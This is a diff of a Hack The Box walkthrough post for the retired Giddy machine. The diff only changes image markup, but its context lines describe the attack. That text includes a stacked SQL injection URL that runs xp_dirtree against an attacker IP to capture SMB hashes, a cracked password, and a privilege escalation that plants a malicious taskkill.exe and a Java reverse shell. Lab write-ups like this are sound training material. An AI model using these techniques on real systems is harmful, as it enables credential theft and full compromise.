@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Giddy, a retired vulnerable [VM]
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -104,15 +104,15 @@ I should probably start the enumeration with `gobuster` and DirBuster's wordlist
 
 I found two directories worth exploring further. This is how they look like.
 
-<a class="image-popup">
-![44ee6275.png](/assets/images/posts/giddy-htb-walkthrough/44ee6275.png)
-</a>
+
+{% include image.html image_alt="44ee6275.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/44ee6275.png" %}
+
 
 My guess was correct—it's really running PowerShell Web Access. It delivers a PowerShell session right in the browser if you have the right credentials.
 
-<a class="image-popup">
-![b3ad3c4a.png](/assets/images/posts/giddy-htb-walkthrough/b3ad3c4a.png)
-</a>
+
+{% include image.html image_alt="b3ad3c4a.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/b3ad3c4a.png" %}
+
 
 Another directory houses a ASP.NET web application. I smell SQL injection...
 
@@ -120,15 +120,15 @@ Another directory houses a ASP.NET web application. I smell SQL injection...
 
 Long story short, this is an example application from OWASP Top 10 Injection exercises and it's vulnerable to all sorts of SQL injection techniques.
 
-<a class="image-popup">
-![b4ac43fd.png](/assets/images/posts/giddy-htb-walkthrough/b4ac43fd.png)
-</a>
+
+{% include image.html image_alt="b4ac43fd.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/b4ac43fd.png" %}
+
 
 Using the `ORDER BY` technique, I was able to determine the UNION columns to be 25. Armed with that insight, we can inject the following query to determine the current user.
 
-<a class="image-popup">
-![a287b22c.png](/assets/images/posts/giddy-htb-walkthrough/a287b22c.png)
-</a>
+
+{% include image.html image_alt="a287b22c.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/a287b22c.png" %}
+
 
 As you can see from above, the current user is `giddy\stacy`. We can actually use an undocumented stored procedure (`xp_dirtree`) to steal SMB credentials. This technique is used by threat actors in the wild to harvest SMB credentials in combination with [watering-hole attack](https://en.wikipedia.org/wiki/Watering_hole_attack).
 
@@ -138,9 +138,9 @@ Here's how.
 
 On your attacking machine, assuming it's Kali Linux, you can set up a SMB server to capture SMB credentials using Metasploit's auxiliary module `auxiliary/server/capture/smb` like so.
 
-<a class="image-popup">
-![1fb1b025.png](/assets/images/posts/giddy-htb-walkthrough/1fb1b025.png)
-</a>
+
+{% include image.html image_alt="1fb1b025.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/1fb1b025.png" %}
+
 
 Execute the undocumented stored procedure from the web application like so.
 
@@ -148,21 +148,21 @@ Execute the undocumented stored procedure from the web application like so.
 https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18; EXEC master.sys.xp_dirtree '\\10.10.14.169',1,1
 ```
 
-<a class="image-popup">
-![b6c03745.png](/assets/images/posts/giddy-htb-walkthrough/b6c03745.png)
-</a>
+
+{% include image.html image_alt="b6c03745.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/b6c03745.png" %}
+
 
 The moment the request is sent, the SMB credentials are captured.
 
-<a class="image-popup">
-![77140cef.png](/assets/images/posts/giddy-htb-walkthrough/77140cef.png)
-</a>
+
+{% include image.html image_alt="77140cef.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/77140cef.png" %}
+
 
 We can now send the captured NT hashes for offline cracking by John the Ripper.
 
-<a class="image-popup">
-![64dfb5ea.png](/assets/images/posts/giddy-htb-walkthrough/64dfb5ea.png)
-</a>
+
+{% include image.html image_alt="64dfb5ea.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/64dfb5ea.png" %}
+
 
 So, Stacy's password is `xNnWo6272k7x`.
 
@@ -170,27 +170,27 @@ So, Stacy's password is `xNnWo6272k7x`.
 
 Armed with Stacy's password, I think it's time to get ourselves a PowerShell.
 
-<a class="image-popup">
-![8eeec4fe.png](/assets/images/posts/giddy-htb-walkthrough/8eeec4fe.png)
-</a>
 
-<a class="image-popup">
-![85ef0972.png](/assets/images/posts/giddy-htb-walkthrough/85ef0972.png)
-</a>
+{% include image.html image_alt="8eeec4fe.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/8eeec4fe.png" %}
+
+
+
+{% include image.html image_alt="85ef0972.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/85ef0972.png" %}
+
 
 The file `user.txt` is located at Stacy's Desktop.
 
-<a class="image-popup">
-![a2c35f45.png](/assets/images/posts/giddy-htb-walkthrough/a2c35f45.png)
-</a>
+
+{% include image.html image_alt="a2c35f45.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/a2c35f45.png" %}
+
 
 ## Privilege Escalation
 
 During enumeration of `stacy`'s account, I notice a file `unifivideo` at the Stacy's Documents.
 
-<a class="image-popup">
-![3a04215c.png](/assets/images/posts/giddy-htb-walkthrough/3a04215c.png)
-</a>
+
+{% include image.html image_alt="3a04215c.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/3a04215c.png" %}
+
 
 It turns out that this is the key to privilege escalation as per EDB-ID [43390](https://www.exploit-db.com/exploits/43390). According to the vulnerability,
 
@@ -202,27 +202,27 @@ It turns out that this is the key to privilege escalation as per EDB-ID [43390](
 
 Indeed, Stacy can write to the folder.
 
-<a class="image-popup">
-![4ffe0fd9.png](/assets/images/posts/giddy-htb-walkthrough/4ffe0fd9.png)
-</a>
+
+{% include image.html image_alt="4ffe0fd9.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/4ffe0fd9.png" %}
+
 
 Stacy should be able to start or stop the service either, otherwise the file `unifivideo` wouldn't be there.
 
-<a class="image-popup">
-![cfd1cce4.png](/assets/images/posts/giddy-htb-walkthrough/cfd1cce4.png)
-</a>
+
+{% include image.html image_alt="cfd1cce4.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/cfd1cce4.png" %}
+
 
 Let's do this! First of all, if the service is running, a `Get-Process` will reveal that `avService` is running.
 
-<a class="image-popup">
-![88be39ae.png](/assets/images/posts/giddy-htb-walkthrough/88be39ae.png)
-</a>
+
+{% include image.html image_alt="88be39ae.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/88be39ae.png" %}
+
 
 Next, let's stop the service with `Stop-Service`.
 
-<a class="image-popup">
-![c0bcb185.png](/assets/images/posts/giddy-htb-walkthrough/c0bcb185.png)
-</a>
+
+{% include image.html image_alt="c0bcb185.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/c0bcb185.png" %}
+
 
 You'll notice that `avservice.exe` is no longer running. And, because I love to get me a shell, I'll attempt to spawn a reverse shell with Java no less. I'd noticed previously Java Runtime Environment (JRE) is available.
 
@@ -269,21 +269,21 @@ Back to the PowerShell Web Access console.
 
 Download our `taskkill.exe` and `rev.jar` to `\ProgramData\unifi-video` with `Invoke-WebRequest`.
 
-<a class="image-popup">
-![6a22260e.png](/assets/images/posts/giddy-htb-walkthrough/6a22260e.png)
-</a>
+
+{% include image.html image_alt="6a22260e.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/6a22260e.png" %}
+
 
 Start the service with `Start-Service` and wait for your SYSTEM shell at your `nc` listener...
 
-<a class="image-popup">
-![eff98628.png](/assets/images/posts/giddy-htb-walkthrough/eff98628.png)
-</a>
+
+{% include image.html image_alt="eff98628.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/eff98628.png" %}
+
 
 The file `root.txt` is at `\Users\Administrator\Desktop`.
 
-<a class="image-popup">
-![892cd85f.png](/assets/images/posts/giddy-htb-walkthrough/892cd85f.png)
-</a>
+
+{% include image.html image_alt="892cd85f.png" image_src="/c702d237-95ac-42a4-8d58-03ac0833798c/892cd85f.png" %}
+
 
 :dancer:
 
